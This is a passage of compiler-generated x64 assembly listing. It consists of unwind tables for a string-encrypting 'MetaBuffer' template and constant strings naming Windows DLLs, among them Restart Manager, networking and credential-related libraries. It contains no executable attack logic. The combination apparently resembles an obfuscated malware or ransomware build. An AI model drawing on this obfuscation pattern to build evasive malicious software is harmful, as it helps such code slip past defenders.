$pdata$?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+542
	DD	imagerel $unwind$??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+584
	DD	imagerel $unwind$??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+584
	DD	imagerel $unwind$??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+626
	DD	imagerel $unwind$??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_C@_09FLKFJBLM@ntdll?4dll@
CONST	SEGMENT
??_C@_09FLKFJBLM@ntdll?4dll@ DB 'ntdll.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@BHPCGNMJ@OleAut32?4dll@
CONST	SEGMENT
??_C@_0N@BHPCGNMJ@OleAut32?4dll@ DB 'OleAut32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_09MDJBOJHM@Ole32?4dll@
CONST	SEGMENT
??_C@_09MDJBOJHM@Ole32?4dll@ DB 'Ole32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@LNAMDANG@Shell32?4dll@
CONST	SEGMENT
??_C@_0M@LNAMDANG@Shell32?4dll@ DB 'Shell32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@OHCDEFLB@Shlwapi?4dll@
CONST	SEGMENT
??_C@_0M@OHCDEFLB@Shlwapi?4dll@ DB 'Shlwapi.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@OKGHKNFP@User32?4dll@
CONST	SEGMENT
??_C@_0L@OKGHKNFP@User32?4dll@ DB 'User32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@EANHMAHB@ws2_32?4dll@
CONST	SEGMENT
??_C@_0L@EANHMAHB@ws2_32?4dll@ DB 'ws2_32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@NKKEACFL@Rstrtmgr?4dll@
CONST	SEGMENT
??_C@_0N@NKKEACFL@Rstrtmgr?4dll@ DB 'Rstrtmgr.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@KCFEDKNO@Iphlpapi?4dll@
CONST	SEGMENT
??_C@_0N@KCFEDKNO@Iphlpapi?4dll@ DB 'Iphlpapi.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@NKMBPHLD@Netapi32?4dll@
CONST	SEGMENT
??_C@_0N@NKMBPHLD@Netapi32?4dll@ DB 'Netapi32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@HAOHNMDE@Kernel32?4dll@
CONST	SEGMENT
??_C@_0N@HAOHNMDE@Kernel32?4dll@ DB 'Kernel32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@DOHINHCI@Advapi32?4dll@
CONST	SEGMENT
??_C@_0N@DOHINHCI@Advapi32?4dll@ DB 'Advapi32.dll', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1BK@EJBALEBG@?$AAK?$AAe?$AAr?$AAn?$AAe?$AAl?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl@
CONST	SEGMENT
??_C@_1BK@EJBALEBG@?$AAK?$AAe?$AAr?$AAn?$AAe?$AAl?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl@ DB 'K'
	DB	00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H, 'l', 00H, '3', 00H
	DB	'2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0257H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01d9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	022dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	022dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
